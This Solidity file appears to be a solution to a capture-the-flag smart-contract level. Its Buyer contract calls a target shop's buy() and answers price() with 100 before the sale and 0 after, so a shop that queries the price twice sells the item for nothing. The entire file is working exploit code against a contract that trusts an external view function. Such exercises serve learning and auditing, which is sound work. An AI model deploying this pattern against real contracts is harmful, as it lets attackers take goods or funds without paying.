// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IShop {
    function isSold() external view returns(bool);
    function buy() external;
}

contract Buyer {
    IShop shop;
    constructor(address target) {
        shop = IShop(target);
    }

    function buy() external {
        shop.buy();
    }

    function price() external view returns(uint) {
        if(!shop.isSold()) {
            return 100;
        } else {
            return 0;
        }
    }
}